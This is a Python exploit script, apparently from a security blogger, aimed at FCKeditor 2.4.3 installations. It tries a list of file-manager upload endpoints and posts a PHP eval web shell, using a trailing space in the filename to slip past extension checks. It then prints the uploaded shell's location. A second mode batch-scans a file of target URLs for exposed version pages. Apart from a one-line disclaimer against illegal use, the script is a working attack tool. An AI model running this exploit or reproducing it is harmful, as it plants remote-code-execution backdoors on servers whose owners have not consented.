import re
import requests
import sys
'''
Github：https://github.com/chaosec2021
'''


xl_uri = ['/fckeditor/_whatsnew.html','/fck/_whatsnew.html','/_whatsnew.html']
upload_uri = ['/editor/filemanager/upload/php/upload.php',
              '/fckeditor/editor/filemanager/upload/php/upload.php',
              '/fck/editor/filemanager/upload/php/upload.php',
              '/editor/filemanager/upload/cfm/upload.cfm',
              '/fckeditor/editor/filemanager/upload/cfm/upload.cfm',
              '/fck/editor/filemanager/upload/cfm/upload.cfm',
              '/editor/filemanager/upload/asp/upload.asp',
              '/fckeditor/editor/filemanager/upload/asp/upload.asp',
              '/fck/editor/filemanager/upload/asp/upload.asp',
              '/editor/filemanager/upload/lasso/upload.lasso',
              '/fckeditor/editor/filemanager/upload/lasso/upload.lasso',
              '/fck/editor/filemanager/upload/lasso/upload.lasso',
              '/editor/filemanager/upload/aspx/upload.aspx',
              '/fckeditor/editor/filemanager/upload/aspx/upload.aspx',
              '/fck/editor/filemanager/upload/aspx/upload.aspx'
              ]    #是上传页面，依次去请求并判断是否存在文件上传的页面

# f =open('fck.txt')

def upload_def(url,f):
    try:
        for uri in upload_uri:
            url_all=url+uri
            header = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36',
            }

            shell ='''<?php @eval($_POST['x']); ?>  
            '''   #木马任意
            file = {'NewFile':(f,shell)}

            res =requests.post(url=url_all,headers=header,files=file)
            code = res.status_code
            res_t = res.text
            if code == 200 and 'window.parent.OnUploadCompleted' in res_t:

                res_re =re.compile(r'201,"(.*?) ",',re.S)
                res_rep=res_re.findall(res_t)
                print(f'[+]上传页面{url+uri}存在')
                print(f'[+]上传成功:{url}{res_rep[0]}')
                break
            else:
                print('[-]请检查该上传页面是否存在')
                continue
    except:
        print('[-]其他错误,可能上传失败，请检查上传的后缀后再尝试')


def check_xl(file):
    f =open(file)
    try:
        for i in f:
            try:
                for uri in xl_uri:
                    i =i.replace('\n','')
                    target = i+uri
                    resource =requests.get(target,timeout=100)
                    res_text=resource.text
                    res_text_1=re.compile(r'<h3>(.*?)</h3>',re.S)
                    res_text_2=res_text_1.findall(res_text)
                    res_code=resource.status_code
                    if res_code ==200 and "FCKeditor - What's New?" in res_text:
                        print(f'[+]{i}疑似存在fck2.4.3文件泄露')
                        print(f'泄露信息如下:{res_text_2}')
                        break
                    else:
                        print(f'[-]不存在{target}信息泄露页面')
                        print('')
                        continue
            except:
                print('请求超时，正在尝试下一个')
                continue
    except:
        print('')
        f.close()

def help():
    print('**** python fck2.4.3_upload.py -h 查看帮助')
    print('**** python fck2.4.3_upload.py -u http://127.0.0.1/ shell.jsp 上传shell ')
    print('**** python fck2.4.3_upload.py --check-file fck.txt 批量检测是否存在fck2.4.3文件泄露的页面')


if __name__=="__main__":
    print('')
    print("by 欢迎关注chaosec公众号，禁止用于一切违法操作")
    print('')
    cmd1 =sys.argv[1]
    try:
        if cmd1 == '-u':
            cmd2 = sys.argv[2]
            cmd3 = sys.argv[3]
            cmd3_1=cmd3+' '
            upload_def(cmd2,cmd3_1)
        elif cmd1 == '--check-file':
            cmd2 = sys.argv[2]
            check_xl(cmd2)
        elif cmd1 == '-h' :
            help()
        else:
            print('[-]其他错误，输入-h查看帮助')
    except:
        print('请输入-h查看帮助')

